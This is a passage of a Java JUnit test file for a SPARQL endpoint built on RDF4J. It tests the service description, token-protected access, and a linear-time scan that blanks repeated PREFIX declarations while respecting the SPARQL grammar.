        var noQuery = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?default-graph-uri=" + enc(EX + "g1")))
                .build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(400, noQuery.statusCode(), noQuery.body());
    }

    /** What the description says follows the endpoint's options, and the access filters guard it as they guard a query. */
    @Test
    void theServiceDescriptionFollowsTheOptions() throws Exception {
        try (Endpoint all = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true).withFederationEnabled(true)
                .withMetadataEnabled(true), 0)) {
            var r = bare(all.url(), "text/turtle");
            assertEquals(200, r.statusCode(), r.body());
            var m = description(r, org.eclipse.rdf4j.rio.RDFFormat.TURTLE);
            var service = m.filter(null, org.eclipse.rdf4j.model.vocabulary.RDF.TYPE, sd("Service")).subjects().iterator().next();
            assertTrue(m.contains(service, sd("supportedLanguage"), sd("SPARQL11Update")), r.body());
            assertTrue(m.contains(service, sd("feature"), sd("BasicFederatedQuery")), r.body());
            assertTrue(m.contains(null, sd("name"), SparqlProtocolServlet.METADATA_GRAPH), r.body());
        }
        try (Endpoint locked = Endpoint.start(EndpointOptions.defaults().withAuthToken("s3cret"), 0)) {
            assertEquals(401, bare(locked.url(), null).statusCode(), "the description is behind the token too");
            assertEquals(200, bare(locked.url(), null, "Authorization", "Bearer s3cret").statusCode());
        }
    }

    /**
     * A prefix declared twice in the prologue is a 400 from RDF4J ("Multiple prefix declarations")
     * but not from Jena or Virtuoso, and rdflib's SPARQLStore prepends some 30 namespaces to every
     * query (#115). The last declaration now wins; only the prologue is touched.
     */
    @Test
    void aPrefixDeclaredAgainTakesItsLastDeclaration() throws Exception {
        // rdflib's shape: its defaults first, then the query's own, the same IRI again
        var same = getCsv(shared.url(), "PREFIX skos: <http://www.w3.org/2004/02/skos/core#>\n"
                + "PREFIX ex: <urn:ex:>\n"
                + "PREFIX skos: <http://www.w3.org/2004/02/skos/core#>\n"
                + "SELECT ?d WHERE { ex:EV-7Q2 ex:depot ?d }");
        assertEquals(200, same.statusCode(), same.body());
        assertTrue(same.body().contains("urn:ex:North"), same.body());
        // another IRI: the last declaration is the one in force, as in Jena
        var last = getCsv(shared.url(), "prefix ex: <urn:wrong:>\nPREFIX ex: <urn:ex:>\n"
                + "SELECT ?d WHERE { ex:EV-7Q2 ex:depot ?d }");
        assertEquals(200, last.statusCode(), last.body());
        assertTrue(last.body().contains("urn:ex:North"), last.body());
        var badIri = get(shared.url(), "PREFIX ex: <http://a:b:c/>\nPREFIX ex: <urn:ex:>\nASK {}", null);
        assertEquals(400, badIri.statusCode(), "a dropped IRI RDF4J refuses is still refused: " + badIri.body());
        // the same IRI twice is dropped whatever it is: RDF4J judges it as it judges the kept one
        var sameOdd = get(shared.url(), "PREFIX od: <http://x/%zz>\nPREFIX od: <http://x/%zz>\nPREFIX ex: <urn:ex:>\n"
                + "ASK { ex:EV-7Q2 ex:depot ?d }", null);
        assertEquals(200, sameOdd.statusCode(), sameOdd.body());
        assertTrue(sameOdd.body().contains("true"), sameOdd.body());
        // another IRI only when it is absolute and strictly valid: a query's resolver would take
        // <http://x/%zz>, an INSERT DATA block would not, so it is left to RDF4J everywhere
        var oddFirst = get(shared.url(), "PREFIX ex: <http://x/%zz>\nPREFIX ex: <urn:ex:>\nASK { ex:EV-7Q2 ex:depot ?d }", null);
        assertEquals(400, oddFirst.statusCode(), oddFirst.body());
        // an error further on still names its own line
        var broken = getCsv(shared.url(), "PREFIX ex: <urn:a:>\nPREFIX ex: <urn:ex:>\nSELECT * WHERE { ?s ?p }");
        assertEquals(400, broken.statusCode(), broken.body());
        assertTrue(broken.body().contains("line 3"), broken.body());
        try (Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            var u = post(rw.url(), "application/sparql-update",
                    "PREFIX ex: <urn:wrong:>\nPREFIX ex: <urn:ex:>\nINSERT DATA { ex:EV-9 ex:depot ex:South }", null);
            assertEquals(204, u.statusCode(), u.body());
            var q = getCsv(rw.url(), "SELECT ?d WHERE { <urn:ex:EV-9> <urn:ex:depot> ?d }");
            assertTrue(q.body().contains("urn:ex:South"), q.body());
            // an INSERT DATA block wants strictly valid, absolute IRIs, a dropped one's too
            for (String odd : List.of("http://x/%zz", "rel/")) {
                var refused = post(rw.url(), "application/sparql-update", "PREFIX ex: <" + odd + ">\nPREFIX ex: <urn:ex:>\n"
                        + "INSERT DATA { ex:EV-10 ex:depot ex:East }", null);
                assertEquals(400, refused.statusCode(), odd + ": " + refused.body());
            }
            assertFalse(getCsv(rw.url(), "SELECT ?d WHERE { <urn:ex:EV-10> ?p ?d }").body().contains("East"));
        }
    }

    /** The prologue scan: what it blanks, and where it stops without touching anything. */
    @Test
    void onlyTheLeadingPrologueIsRewritten() {
        String plain = "PREFIX a: <urn:a> SELECT * {}";
        assertSame(plain, SparqlProtocolServlet.withoutRepeatedPrefixes(plain));
        String twice = "PREFIX a: <urn:x>\r\n# note\nBASE <http://b/>\nprefix a:<urn:a>\nSELECT * {}";
        String once = SparqlProtocolServlet.withoutRepeatedPrefixes(twice);
        assertEquals(twice.length(), once.length());
        assertEquals("                 \r\n# note\nBASE <http://b/>\nprefix a:<urn:a>\nSELECT * {}", once);
        assertEquals(" ".repeat("PREFIX : <urn:a>".length()) + "PREFIX : <urn:b> ASK {}",
                SparqlProtocolServlet.withoutRepeatedPrefixes("PREFIX : <urn:a>PREFIX : <urn:b> ASK {}"));
        // nothing past the prologue is read: a body that repeats the words is left alone
        String body = "PREFIX a: <urn:a> SELECT * { ?s ?p \"PREFIX a: <urn:a>\" } # PREFIX a: <urn:a>";
        assertSame(body, SparqlProtocolServlet.withoutRepeatedPrefixes(body));
        // a declaration it cannot read with certainty ends the scan: RDF4J answers for it
        String unsure = "PREFIX a: # c >\n <urn:a>\nPREFIX a: <urn:a> ASK {}";
        assertSame(unsure, SparqlProtocolServlet.withoutRepeatedPrefixes(unsure));
        String update = "PREFIX a: <urn:a> INSERT DATA {} ; PREFIX a: <urn:a> PREFIX a: <urn:a> INSERT DATA {}";
        assertSame(update, SparqlProtocolServlet.withoutRepeatedPrefixes(update), "only the first operation's prologue");
    }

    /**
     * The scan reads the prologue by the grammar, never more loosely (found in the Opus co-review
     * of #135): a comment ends at CR as well as LF, so it cannot run on into a string literal;
     * and Unicode spaces, a dotless ı in a keyword, a non-ASCII prefix name or a character IRIREF
     * excludes stop it, leaving RDF4J to refuse what is malformed.
     */
    @Test
    void thePrologueScanFollowsTheGrammar() {
        // a bare CR ends the comment: the body begins there, and its literal is never touched
        String literal = "#c\rSELECT ?x WHERE { ?x <urn:p> \"\"\"\nPREFIX a: <urn:a> PREFIX a: <urn:b>\"\"\" }";
        assertSame(literal, SparqlProtocolServlet.withoutRepeatedPrefixes(literal));
        assertEquals("#c\r                 \rPREFIX a: <urn:b>\rASK {}",
                SparqlProtocolServlet.withoutRepeatedPrefixes("#c\rPREFIX a: <urn:a>\rPREFIX a: <urn:b>\rASK {}"));
        for (String loose : List.of(
                "PREFIX\u2028a: <urn:a>\nPREFIX a: <urn:b>\nASK {}",
                "PREFIX a:\u3000<urn:a>\nPREFIX a: <urn:b>\nASK {}",
                "PREF\u0131X a: <urn:a>\nPREFIX a: <urn:b>\nASK {}",
                "PREFIX a: <urn:{x}>\nPREFIX a: <urn:b>\nASK {}",
                "PREFIX a: <urn:a b>\nPREFIX a: <urn:b>\nASK {}",
                "PREFIX \u00e9: <urn:a>\nPREFIX \u00e9: <urn:b>\nASK {}",
                "PREFIX a.: <urn:a>\nPREFIX a.: <urn:b>\nASK {}")) {
            assertSame(loose, SparqlProtocolServlet.withoutRepeatedPrefixes(loose), loose);
        }
        // RDF4J decodes \\uXXXX before it tokenizes: an escaped line break ends a comment there,
        // so a backslash in a comment leaves the text alone (the literal keeps both copies)
        String escaped = "#note\\u000AINSERT DATA { <urn:s> <urn:p> \"\"\"\nPREFIX a: <urn:a> PREFIX a: <urn:a>\"\"\" }";
        assertSame(escaped, SparqlProtocolServlet.withoutRepeatedPrefixes(escaped));
        // a dropped declaration whose IRI RDF4J refuses is not blanked away: it stays a 400
        for (String refused : List.of("PREFIX a: <http://a:b:c/> PREFIX a: <urn:b> ASK {}",
                "PREFIX a: <http://[x/> PREFIX a: <urn:b> ASK {}")) {
            assertSame(refused, SparqlProtocolServlet.withoutRepeatedPrefixes(refused), refused);
        }
        // any backslash in a comment, not only an escape, leaves the text alone
        String backslash = "# see C:\\data\nPREFIX a: <urn:a> PREFIX a: <urn:b> ASK {}";
        assertSame(backslash, SparqlProtocolServlet.withoutRepeatedPrefixes(backslash));
        // and what the scan does rewrite, RDF4J then accepts
        org.eclipse.rdf4j.query.parser.QueryParserUtil.parseQuery(org.eclipse.rdf4j.query.QueryLanguage.SPARQL,
                SparqlProtocolServlet.withoutRepeatedPrefixes("prefix ex-1.b: <urn:a>\tPREFIX ex-1.b: <urn:b> ASK { ex-1.b:x ?p ?o }"), null);
    }

    /** One pass: a 1 MB body of declarations took 4.4 s, in a query slot, when each was searched for again. */
    @Test
    void thePrologueScanIsLinear() {
        StringBuilder q = new StringBuilder();
        for (int i = 0; i < 150_000; i++) {
            q.append("PREFIX p").append(i).append(": <urn:x>\n");
        }
        q.append("PREFIX p0: <urn:y>\nASK {}");
        long t0 = System.nanoTime();
        String out = SparqlProtocolServlet.withoutRepeatedPrefixes(q.toString());
        long millis = (System.nanoTime() - t0) / 1_000_000;
        assertTrue(out.startsWith(" ".repeat("PREFIX p0: <urn:x>".length()) + "\n"), "the first p0 is blanked");
        assertTrue(millis < 2_000, "150,000 declarations took " + millis + " ms");
    }

    @SuppressWarnings("unused")
    private static void silence(IOException ignored) { }
}
